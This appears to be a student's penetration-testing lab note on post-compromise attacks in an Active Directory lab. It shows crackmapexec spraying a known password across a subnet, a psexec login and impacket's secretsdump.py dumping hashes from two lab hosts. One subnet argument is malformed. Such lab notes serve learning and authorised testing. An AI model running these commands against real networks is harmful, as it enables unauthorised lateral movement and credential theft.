[*] Post-Compromise Attacks

[*] Pass The Hash/Pass The Password

[*] For This, We Are Going To Use A Tool: crackmapexec
[*] Installation:

apt-get install crackmapexec

[*] Attacking

[*] As We Know, We Have Comromised A Machines(fcastle:Password1), We Will Use It To Attck Further
[*] Command:

crackmapexec <DomainIP>/24 -u <UserName> -d <DomainName>.local -p <Password>
crackmapexec 192.168.57.0.24 -u fcastle -d MARVEL.local -p Password1

[*] As We Can See In The Output, We Compromised Another Machine With The Same Password
[*] Lets Try To Login Using psexec.py. Success! 

[*] Lets Dump Hashes Using secretsdump.py

https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py

[*] Command:

secretsdump.py <DomainName>/<Username>:<Password>@<VictimIp>

secretsdump.py marvel/fcastle:Password1@192.168.57.141

[*] Got The Hashes! Lets Try With The Other Machine That We Accessed Using Pass The Hash

secretsdump.py marvel/fcastle:Password1@192.168.57.142

[*] Got The Hashes For This Machine Too!